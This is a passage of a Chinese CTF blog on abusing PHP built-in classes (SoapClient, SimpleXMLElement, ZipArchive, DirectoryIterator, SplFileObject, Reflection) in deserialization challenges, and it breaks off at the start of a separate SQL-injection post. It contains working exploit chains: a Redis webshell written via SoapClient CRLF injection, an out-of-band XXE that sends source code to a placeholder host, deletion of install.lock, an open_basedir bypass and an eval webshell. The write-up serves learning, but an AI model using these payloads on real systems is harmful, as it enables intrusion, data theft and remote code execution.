<h1 id="使用soapClient类进行SSRF"><a href="#使用soapClient类进行SSRF" class="headerlink" title="使用soapClient类进行SSRF"></a>使用soapClient类进行SSRF</h1><h2 id="soapClient类"><a href="#soapClient类" class="headerlink" title="soapClient类"></a>soapClient类</h2><p>PHP 的内置类 SoapClient 是一个专门用来访问 Web 服务的类，可以提供一个基于 SOAP 协议访问 Web 服务的 PHP 客户端。</p>
<p>类摘要如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SoapClient &#123;</span><br><span class="line">    /* 方法 */</span><br><span class="line">    public __construct ( string|null $wsdl , array $options = [] )</span><br><span class="line">    public __call ( string $name , array $args ) : mixed</span><br><span class="line">    public __doRequest ( string $request , string $location , string $action , int $version , bool $oneWay = false ) : string|null</span><br><span class="line">    public __getCookies ( ) : array</span><br><span class="line">    public __getFunctions ( ) : array|null</span><br><span class="line">    public __getLastRequest ( ) : string|null</span><br><span class="line">    public __getLastRequestHeaders ( ) : string|null</span><br><span class="line">    public __getLastResponse ( ) : string|null</span><br><span class="line">    public __getLastResponseHeaders ( ) : string|null</span><br><span class="line">    public __getTypes ( ) : array|null</span><br><span class="line">    public __setCookie ( string $name , string|null $value = null ) : void</span><br><span class="line">    public __setLocation ( string $location = &quot;&quot; ) : string|null</span><br><span class="line">    public __setSoapHeaders ( SoapHeader|array|null $headers = null ) : bool</span><br><span class="line">    public __soapCall ( string $name , array $args , array|null $options = null , SoapHeader|array|null $inputHeaders = null , array &amp;$outputHeaders = null ) : mixed</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，该内置类有一个 <code>__call</code> 方法，当 <code>__call</code> 方法被触发后，它可以发送 HTTP 和 HTTPS 请求。正是这个 <code>__call</code> 方法，使得 SoapClient 类可以被我们运用在 SSRF 中。SoapClient 这个类也算是目前被挖掘出来最好用的一个内置类。</p>
<p>该类的构造函数如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public SoapClient :: SoapClient(mixed $wsdl [，array $options ])</span><br></pre></td></tr></table></figure>

<ul>
<li>第一个参数是用来指明是否是 wsdl 模式，将该值设为 null 则表示非 wsdl 模式。</li>
<li>第二个参数为一个数组，如果在 wsdl 模式下，此参数可选；如果在非 wsdl 模式下，则必须设置 location 和 uri 选项，其中 location 是要将请求发送到的 SOAP 服务器的 URL，而 uri 是 SOAP 服务的目标命名空间。</li>
</ul>
<p>成功的前提需要先把 php.ini 开启 <code>extension=soup</code></p>
<h2 id="SoapClient-ssrf"><a href="#SoapClient-ssrf" class="headerlink" title="SoapClient+ssrf"></a>SoapClient+ssrf</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">//hint: Redis20251206</span><br><span class="line"></span><br><span class="line">class pure&#123;</span><br><span class="line">    public $web;</span><br><span class="line">    public $misc;</span><br><span class="line">    public $crypto;</span><br><span class="line">    public $pwn;</span><br><span class="line"></span><br><span class="line">    public function __construct($web, $misc, $crypto, $pwn)&#123;</span><br><span class="line">        $this-&gt;web = $web;</span><br><span class="line">        $this-&gt;misc = $misc;</span><br><span class="line">        $this-&gt;crypto = $crypto;</span><br><span class="line">        $this-&gt;pwn = $pwn;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function reverse()&#123;</span><br><span class="line">        $this-&gt;pwn = new $this-&gt;web($this-&gt;misc, $this-&gt;crypto);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function osint()&#123;</span><br><span class="line">        $this-&gt;pwn-&gt;play_0xGame();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        $this-&gt;reverse();</span><br><span class="line">        $this-&gt;osint();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$AI = $_GET[&#x27;ai&#x27;];</span><br><span class="line"></span><br><span class="line">$ctf = unserialize($AI);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/ab758827/1761881367458-9cde0542-c1d3-4c28-b75c-6a9db698f6bb.png" alt="img"></p>
<p>这里会调用未知方法，所以可以调用到魔术方法call（这里会想到soapclient类的call方法），在结合提示redis和20251206（密码），这就是ssrf+redis。</p>
<p>主要利用请求头进行攻击（CLRF）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class pure &#123;</span><br><span class="line">    public $web;</span><br><span class="line">    public $misc;</span><br><span class="line">    public $crypto;</span><br><span class="line">    public $pwn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new pure();</span><br><span class="line">$a-&gt;web = &#x27;SoapClient&#x27;;</span><br><span class="line">$a-&gt;misc = null;</span><br><span class="line">$target = &#x27;http://127.0.0.1:6379/&#x27;;</span><br><span class="line">$poc = &quot;AUTH 20251206\r\nCONFIG SET dir /var/www/html/\r\nCONFIG SET dbfilename shell.php\r\nSET x &#x27;&lt;?= @eval(\$_POST[1]) ?&gt;&#x27;\r\nSAVE&quot;;</span><br><span class="line">$a-&gt;crypto = array(&#x27;location&#x27; =&gt; $target, &#x27;uri&#x27; =&gt; &quot;hello\&quot;\r\n&quot; . $poc . &quot;\r\nhello&quot;);</span><br><span class="line">echo urlencode(serialize($a));</span><br></pre></td></tr></table></figure>

<ul>
<li><code>\r\n</code> 是HTTP协议中的换行符</li>
<li>通过注入换行符，将Redis命令作为HTTP头部注入</li>
<li>Redis会将这些命令解析并执行</li>
</ul>
<p>传入shell，连接蚁剑得到flag</p>
<p><img src="/posts/ab758827/1761882045840-58b2025b-9ed5-4cc2-b4d6-925543bb78da.png" alt="img"></p>
<h1 id="使用Directorylterator类绕过open-basedir"><a href="#使用Directorylterator类绕过open-basedir" class="headerlink" title="使用Directorylterator类绕过open_basedir"></a>使用Directorylterator类绕过open_basedir</h1><p>DirectoryIterator 类提供了一个用于查看文件系统目录内容的简单接口，该类是在 PHP 5 中增加的一个类。翻译过来就是文件枚举迭代器。</p>
<p>Directorylterator与glob:&#x2F;&#x2F;协议结合将无视open_basedir对目录的限制，可以用来列举出指定目录下的文件</p>
<p>测试源码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// test.php</span><br><span class="line">&lt;?php</span><br><span class="line">$dir = $_GET[&#x27;whoami&#x27;];</span><br><span class="line">$a = new DirectoryIterator($dir);</span><br><span class="line">foreach($a as $f)&#123;</span><br><span class="line">    echo($f-&gt;__toString().&#x27;&lt;br&gt;&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"># payload一句话的形式:</span><br><span class="line">$a = new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#x27;&lt;br&gt;&#x27;);&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/ab758827/1765887212161-1bc0921c-0e86-41cc-ac0c-1bf7ccb544ce.png" alt="img"></p>
<p>这边可以直接列取根目录</p>
<p><img src="/posts/ab758827/1765887201330-bfb3b7c6-a8b4-4bc9-ac6d-6f07e93fe275.png" alt="img"></p>
<p>但是不能进行文件读取</p>
<p>同样效果的还有 FilesystemIterator 类与 GlobIterator 类</p>
<h1 id="使用-SimpleXMLElement-类进行-XXE"><a href="#使用-SimpleXMLElement-类进行-XXE" class="headerlink" title="使用 SimpleXMLElement 类进行 XXE"></a>使用 SimpleXMLElement 类进行 XXE</h1><p>官方文档中对于 SimpleXMLElement 类的构造方法 <code>SimpleXMLElement::__construct</code> 的定义如下：</p>
<p><img src="/posts/ab758827/1765887628525-9eb91ea3-0ae9-4f39-b72d-24ceec5bee6e.png" alt="img"></p>
<p><img src="/posts/ab758827/1765887646912-643d4380-0a8a-490d-997f-69d990692bcc.png" alt="img"></p>
<p>可以看到通过设置第三个参数 data_is_url 为 <code>true</code>，我们可以实现远程 xml 文件的载入。第二个参数的常量值我们设置为 <code>2</code> 即可。第一个参数 data 就是我们自己设置的 payload 的 url 地址，即用于引入的外部实体的 url。</p>
<p>这样的话，当我们可以控制目标调用的类的时候，便可以通过 SimpleXMLElement 这个内置类来构造 XXE。</p>
<h2 id="SUCTF-2018-Homework"><a href="#SUCTF-2018-Homework" class="headerlink" title="[SUCTF 2018]Homework"></a>[SUCTF 2018]Homework</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class calc&#123;</span><br><span class="line">	function __construct__()&#123;</span><br><span class="line">		calc();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	function calc($args1,$method,$args2)&#123;</span><br><span class="line">		$args1=intval($args1);</span><br><span class="line">		$args2=intval($args2);</span><br><span class="line">		switch ($method) &#123;</span><br><span class="line">			case &#x27;a&#x27;:</span><br><span class="line">				$method=&quot;+&quot;;</span><br><span class="line">				break;</span><br><span class="line"></span><br><span class="line">			case &#x27;b&#x27;:</span><br><span class="line">				$method=&quot;-&quot;;</span><br><span class="line">				break;</span><br><span class="line"></span><br><span class="line">			case &#x27;c&#x27;:</span><br><span class="line">				$method=&quot;*&quot;;</span><br><span class="line">				break;</span><br><span class="line"></span><br><span class="line">			case &#x27;d&#x27;:</span><br><span class="line">				$method=&quot;/&quot;;</span><br><span class="line">				break;</span><br><span class="line">			</span><br><span class="line">			default:</span><br><span class="line">				die(&quot;invalid input&quot;);</span><br><span class="line">		&#125;</span><br><span class="line">		$Expression=$args1.$method.$args2;</span><br><span class="line">		eval(&quot;\$r=$Expression;&quot;);</span><br><span class="line">		die(&quot;Calculation results:&quot;.$r);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;		</span><br></pre></td></tr></table></figure>

<p>登录进来有一个源码，但是没有什么可以利用的点</p>
<p><img src="/posts/ab758827/1765889268089-5604e837-7cad-4d00-9017-eaaf595a8410.png" alt="img"></p>
<p>我们来看一下这里</p>
<p>出现了module这里是对类名的调用，后面是参数，这样可以使用simpleXmlElement来打一个无回显的xxe</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://d40c479f-f84a-495e-a09a-3ac1d2184c9d.node5.buuoj.cn:81/show.php?module=SimpleXMLElement&amp;args[]=http://ip/evil.xml&amp;args[]=2&amp;args[]=true</span><br></pre></td></tr></table></figure>

<p>evil.xml</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http:/ip/send.xml&quot;&gt;</span><br><span class="line">%remote;</span><br><span class="line">%all;</span><br><span class="line">%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>

<p>send.xml</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=index.php&quot;&gt;</span><br><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://ip/send.php?file=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>send.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">file_put_contents(&quot;result.txt&quot;, $_GET[&#x27;file&#x27;]) ;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>不知道是我的原因还是buu的原因，这里的源码带不出来但是这个思路肯定是能用的</p>
<h1 id="使用-ZipArchive-类来删除文件"><a href="#使用-ZipArchive-类来删除文件" class="headerlink" title="使用 ZipArchive 类来删除文件"></a>使用 ZipArchive 类来删除文件</h1><p>PHP ZipArchive 类是 PHP 的一个原生类，它是在 PHP 5.2.0 之后引入的。ZipArchive 类可以对文件进行压缩与解压缩处理。</p>
<p>下面列举几个常见的类方法：</p>
<ul>
<li><code>ZipArchive::addEmptyDir</code>：添加一个新的文件目录</li>
<li><code>ZipArchive::addFile</code>：将文件添加到指定zip压缩包中</li>
<li><code>ZipArchive::addFromString</code>：添加新的文件同时将内容添加进去</li>
<li><code>ZipArchive::close</code>：关闭 ZipArchive</li>
<li><code>ZipArchive::extractTo</code>：将压缩包解压</li>
<li><code>ZipArchive::open</code>：打开一个zip压缩包</li>
<li><code>ZipArchive::deleteIndex</code>：删除压缩包中的某一个文件，如：<code>deleteIndex(0)</code> 代表删除第一个文件</li>
<li><code>ZipArchive::deleteName</code>：删除压缩包中的某一个文件名称，同时也将文件删除</li>
<li>……</li>
</ul>
<p>我们来重点看看 <code>ZipArchive::open</code> 方法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ZipArchive::open ( string $filename [, int $flags ] ) : mixed</span><br></pre></td></tr></table></figure>

<p>该方法用来打开一个新的或现有的 zip 存档以进行读取，写入或修改。</p>
<ul>
<li><code>$filename</code>：要打开的 ZIP 存档的文件名。</li>
<li><code>$flags</code>：用于打开档案的模式。有以下几种模式：</li>
<li><code>ZipArchive::OVERWRITE</code>：总是以一个新的压缩包开始，此模式下如果已经存在则会被覆盖或删除。</li>
<li><code>ZipArchive::CREATE</code>：如果不存在则创建一个 zip 压缩包。</li>
<li><code>ZipArchive::RDONLY</code>：只读模式打开压缩包。</li>
<li><code>ZipArchive::EXCL</code>：如果压缩包已经存在，则出错。</li>
<li><code>ZipArchive::CHECKCONS</code>：对压缩包执行额外的一致性检查，如果失败则显示错误。</li>
</ul>
<p>注意，如果设置 flags 参数的值为 <code>ZipArchive::OVERWRITE</code> 的话，可以把指定文件删除。这里我们跟进方法可以看到 <code>const OVERWRITE = 8</code>，也就是将 OVERWRITE 定义为了常量8，我们在调用时也可以直接将 <code>$flags</code> 赋值为8。</p>
<p>也就是说我们可以利用 ZipArchive 原生类调用 open 方法删除目标主机上的文件。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a = new ZipArchive();</span><br><span class="line">$a-&gt;open(&#x27;1.txt&#x27;,ZipArchive::OVERWRITE);  </span><br><span class="line">// ZipArchive::OVERWRITE:  总是以一个新的压缩包开始，此模式下如果已经存在则会被覆盖</span><br><span class="line">// 因为没有保存，所以效果就是删除了1.txt</span><br></pre></td></tr></table></figure>

<h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><p>题目是铸剑杯的，源码还是存着的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class install &#123;</span><br><span class="line">    private $username;</span><br><span class="line">    private $password;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;Hello,&quot;.$this-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        ($this-&gt;username)();</span><br><span class="line">        return &quot;Guest&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        if(file_exists(&quot;install.lock&quot;))&#123;</span><br><span class="line">            exit(&quot;Already installed&quot;);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $config = [</span><br><span class="line">                &#x27;username&#x27; =&gt; $this-&gt;username,</span><br><span class="line">                &#x27;password&#x27; =&gt; md5($this-&gt;password)</span><br><span class="line">            ];</span><br><span class="line">            file_put_contents(&#x27;config.php&#x27;, serialize($config));</span><br><span class="line">            file_put_contents(&#x27;install.lock&#x27;, &quot;ok&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Until &#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line">    public $c;</span><br><span class="line"></span><br><span class="line">    public function __invoke()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;write($this-&gt;a, $this-&gt;b, $this-&gt;c);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        return &quot;HappyUnserialize&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function write($cla, $file, $cont)</span><br><span class="line">    &#123;</span><br><span class="line">        $obj = new $cla();</span><br><span class="line">        $obj-&gt;open($file,$cont);</span><br><span class="line">        return True;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@unserialize($_GET[&#x27;data&#x27;]);</span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class install &#123;</span><br><span class="line">    private $username;</span><br><span class="line">    private $password;</span><br><span class="line"></span><br><span class="line">    public function __construct($username, $password)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;username = $username;</span><br><span class="line">        $this-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Until &#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line">    public $c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$c = new Until();</span><br><span class="line">$c-&gt;a = &#x27;ZipArchive&#x27;;</span><br><span class="line">$c-&gt;b = &#x27;install.lock&#x27;;</span><br><span class="line">$c-&gt;c = 8;</span><br><span class="line">$c-&gt;d = &quot;&lt;?php @eval(\$_POST[1]);?&gt;&quot;;</span><br><span class="line">$b = new install($c,123);</span><br><span class="line">$a = new install($b,123);</span><br><span class="line"></span><br><span class="line">echo urlencode(serialize($a));</span><br></pre></td></tr></table></figure>

<h1 id="使用SplFileObject来进行文件内容读取"><a href="#使用SplFileObject来进行文件内容读取" class="headerlink" title="使用SplFileObject来进行文件内容读取"></a>使用SplFileObject来进行文件内容读取</h1><p>SplFileObject 类为单个文件的信息提供了一个高级的面向对象的接口，可以用于对文件内容的遍历、查找、操作等。详情请参考：<a href="https://www.php.net/manual/zh/class.splfileobject.php">https://www.php.net/manual/zh/class.splfileobject.php</a></p>
<p>该类的构造方法可以构造一个新的文件对象用于后续的读取。</p>
<p>我们可以像类似下面这样去读取一个文件的一行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$content = new SplFileObject(&#x27;1.txt&#x27;);</span><br><span class="line">echo $content;</span><br></pre></td></tr></table></figure>

<p>只能读取一行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$content = new SplFileObject(&#x27;1.txt&#x27;);</span><br><span class="line">foreach ($content as $line) &#123;</span><br><span class="line">    echo $line ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/ab758827/1765893535284-2e398325-5e11-47c5-93cd-2fd5d23ef92a.png" alt="img"></p>
<p>读取多行</p>
<h2 id="GHCTF-2025-Popppppp"><a href="#GHCTF-2025-Popppppp" class="headerlink" title="[GHCTF 2025]Popppppp"></a>[GHCTF 2025]Popppppp</h2><p>exp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class CherryBlossom &#123;</span><br><span class="line">    public $fruit1;</span><br><span class="line">    public $fruit2;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        echo $this-&gt;fruit1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __toString() &#123;</span><br><span class="line">        $newFunc = $this-&gt;fruit2;</span><br><span class="line">        return $newFunc();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Philosopher &#123;</span><br><span class="line">    public $fruit10;</span><br><span class="line">    public $fruit11=&quot;M7O3sikpATKW9t1AiqA4&quot;;</span><br><span class="line"></span><br><span class="line">    public function __invoke() &#123;</span><br><span class="line">        if (md5(md5($this-&gt;fruit11)) == 666) &#123;</span><br><span class="line">            return $this-&gt;fruit10-&gt;hey;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Mystery &#123;</span><br><span class="line"></span><br><span class="line">    public $GlobIterator=&quot;/*&quot;；</span><br><span class="line">    public function __get($arg1) &#123;</span><br><span class="line">        array_walk($this, function ($day1, $day2) &#123;</span><br><span class="line">            $day3 = new $day2($day1);</span><br><span class="line">            foreach ($day3 as $day4) &#123;</span><br><span class="line">                echo ($day4 . &#x27;&lt;br&gt;&#x27;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$x=new CherryBlossom();</span><br><span class="line">$x-&gt;fruit1 = new CherryBlossom();</span><br><span class="line">$x-&gt;fruit1-&gt;fruit2 = new Philosopher();</span><br><span class="line">$x-&gt;fruit1-&gt;fruit2-&gt;fruit10 = new Mystery();</span><br><span class="line"></span><br><span class="line">print_r(serialize($x));</span><br></pre></td></tr></table></figure>

<p><img src="/posts/ab758827/1741603442808-7a3cb1bf-4ef8-4722-b615-3d3da2f4e495.png" alt="img"></p>
<p>将其实例化一个对象array_walk遍历数组，并赋值day1为值，day2为键</p>
<p>day3 将其实例化 day3&#x3D;new GlobTterator（&#x2F;*）</p>
<p><img src="/posts/ab758827/1741604014980-63acd2a0-bd50-44fe-b4b2-23b51c2bbe4e.png" alt="img"></p>
<p>列出目录</p>
<p><img src="/posts/ab758827/1741604107215-8ef07610-26d0-421a-a09a-45466201c291.png" alt="img"></p>
<p>读取内容</p>
<p>有关php原生类的调用，反序列化时可连续调用同一个类（更简便）</p>
<p><img src="/posts/ab758827/1741524481002-0e0095a0-b557-4034-af4a-f28d1b972079.png" alt="img"></p>
<p>更改Mystery类的属性</p>
<p><img src="/posts/ab758827/1741524514610-de90761e-3e28-4867-b69b-671461da978c.png" alt="img"></p>
<p>拿到flag</p>
<p>双重碰撞md5的脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import multiprocessing</span><br><span class="line">import hashlib</span><br><span class="line">import random</span><br><span class="line">import string</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">CHARS = string.ascii_letters + string.digits</span><br><span class="line"></span><br><span class="line">def cmp_md5(substr, stop_event, str_len, start=0, size=20):</span><br><span class="line">    global CHARS</span><br><span class="line">    while not stop_event.is_set():</span><br><span class="line">        rnds = &#x27;&#x27;.join(random.choice(CHARS) for _ in range(size))</span><br><span class="line">        md5 = hashlib.md5(rnds)</span><br><span class="line">        value = md5.hexdigest()</span><br><span class="line">        if value[start: start + str_len] == substr:</span><br><span class="line">            # print rnds</span><br><span class="line">            # stop_event.set()</span><br><span class="line"></span><br><span class="line">            # 碰撞双md5</span><br><span class="line">            md5 = hashlib.md5(value)</span><br><span class="line">            if md5.hexdigest()[start: start + str_len] == substr:</span><br><span class="line">                print (rnds + &quot;=&gt;&quot; + value + &quot;=&gt;&quot; + md5.hexdigest() + &quot;\n&quot;)</span><br><span class="line">                stop_event.set()</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    substr = sys.argv[1].strip()</span><br><span class="line">    start_pos = int(sys.argv[2]) if len(sys.argv) &gt; 1 else 0</span><br><span class="line">    str_len = len(substr)</span><br><span class="line">    cpus = multiprocessing.cpu_count()</span><br><span class="line">    stop_event = multiprocessing.Event()</span><br><span class="line">    processes = [multiprocessing.Process(target=cmp_md5, args=(substr,</span><br><span class="line">                                                               stop_event,</span><br><span class="line">str_len, start_pos))</span><br><span class="line">                for i in range(cpus)]</span><br><span class="line">    for p in processes:</span><br><span class="line">        p.start()</span><br><span class="line">    for p in processes:</span><br><span class="line">        p.join()</span><br></pre></td></tr></table></figure>

<p>#python2 md5.py “666” 0 </p>
<h1 id="反射类Reflection"><a href="#反射类Reflection" class="headerlink" title="反射类Reflection"></a>反射类Reflection</h1><p>大体上和 Java 的反射也是一样的</p>
<p>ReflectionMethod 类报告了一个方法的有关信息。ReflectionMethod 类中有很多继承方法可以使用，比如这个 <code>getDocComment()</code> 方法，我们可以用它来获取类中各个函数注释内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class FlagIsHere</span><br><span class="line">&#123;</span><br><span class="line">    /**</span><br><span class="line">     * 这是测试方法</span><br><span class="line">     * flag&#123;success&#125;</span><br><span class="line">     * @return int</span><br><span class="line">     */</span><br><span class="line">    protected function GiveMeFlag()</span><br><span class="line">    &#123;</span><br><span class="line">        return 9999;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ref = new ReflectionMethod(&#x27;FlagIsHere&#x27;,&#x27;GiveMeFlag&#x27;);</span><br><span class="line">var_dump($ref-&gt;getDocComment());</span><br></pre></td></tr></table></figure>

<p><img src="/posts/ab758827/1765946508302-14d5f0cf-1b0c-40e4-be96-7ffeaec48d00.png" alt="img"></p>
<h2 id="使用ReflectionClass类获取类的属性和方法名"><a href="#使用ReflectionClass类获取类的属性和方法名" class="headerlink" title="使用ReflectionClass类获取类的属性和方法名"></a>使用ReflectionClass类获取类的属性和方法名</h2><ul>
<li>ReflectionClass 类报告了一个类的有关信息。其中初始化方法能够返回类的实例。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public ReflectionClass::__construct(mixed $argument)</span><br></pre></td></tr></table></figure>

<ul>
<li><code>$argument</code>：既可以是包含类名的字符串（string）也可以是对象（object）。</li>
</ul>
<p>用法如下</p>
<p>example：</p>
<p><img src="/posts/ab758827/1765947016945-764de7a8-02b3-4e07-8c8d-a74fb84cd018.png" alt="img"></p>
<p>把类里面属性和方法的名字都能够显示出来。</p>
<h2 id="使用ReflectionFunction类写Webshell"><a href="#使用ReflectionFunction类写Webshell" class="headerlink" title="使用ReflectionFunction类写Webshell"></a>使用ReflectionFunction类写Webshell</h2><p><strong>ReflectionFunction</strong> 类报告了一个函数的有关信息。其中<code>invokeArgs()</code>方法能够用来写Webshell。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public ReflectionFunction::invokeArgs(array $args): mixed</span><br></pre></td></tr></table></figure>

<ul>
<li><code>$args</code>：传递给函数的参数是一个数组，像 <code>call_user_func_array()</code> 的工作方式。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function title($title, $name)</span><br><span class="line">&#123;</span><br><span class="line">    return sprintf(&quot;%s. %s\r\n&quot;, $title, $name); </span><br><span class="line">&#125; //方法</span><br><span class="line"> </span><br><span class="line">$function = new ReflectionFunction(&#x27;title&#x27;);</span><br><span class="line"> </span><br><span class="line">echo $function-&gt;invokeArgs(array(&#x27;Dr&#x27;, &#x27;Phil&#x27;)); //参数</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/ab758827/1765947281273-e2d6c788-891f-4b15-8d6b-ccb102f5e5c8.png" alt="img"></p>
<p>写入webshell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $func = new ReflectionFunction($_GET[m]);</span><br><span class="line">    echo $func-&gt;invokeArgs(array($_GET[c]));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/ab758827/1765947461095-38cd1053-2bc9-49a7-b49f-4795ae48bf08.png" alt="img"></p>
<p>题目就是，大家可以去看一下<a href="https://tari.moe/2021/2021hmb-offline.html">https://tari.moe/2021/2021hmb-offline.html</a></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://drun1baby.top/2023/04/11/PHP-%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/#0x09-%E5%8F%8D%E5%B0%84%E7%B1%BB-Reflection">https://drun1baby.top/2023/04/11/PHP-%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/#0x09-%E5%8F%8D%E5%B0%84%E7%B1%BB-Reflection</a></p>
<p><a href="https://tari.moe/2021/2021hmb-offline.html">https://tari.moe/2021/2021hmb-offline.html</a></p>
]]></content>
      <categories>
        <category>知识点</category>
      </categories>
  </entry>
  <entry>
    <title>sql-未知列名的注入</title>
    <url>/posts/28db1d4e/</url>
    <content><![CDATA[<p>参考<a href="https://www.jianshu.com/p/6eba3370cfab">https://www.jianshu.com/p/6eba3370cfab</a></p>
<h2 id="未知列名查询"><a href="#未知列名查询" class="headerlink" title="未知列名查询"></a>未知列名查询</h2><p>1.正常下我们是查询到以下情况</p>
<p><img src="/posts/28db1d4e/1755779117586-299e0977-249c-420b-8679-48ef6010486a.png" alt="img"></p>
<p>2.当我们结合到union的方法时</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 1,2,3 union select * from users;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/28db1d4e/1755779266513-b1388504-8954-49b9-b63b-357fe1d776f2.png" alt="img"></p>
<p>3.然后我们就可以使用数字来对应列了，例如3对应表里的pass</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select `3` from (select 1,2,3 union select * from users)a;</span><br></pre></td></tr></table></figure>

<p>这边解释一下为什么要加a，加上a类似于</p>
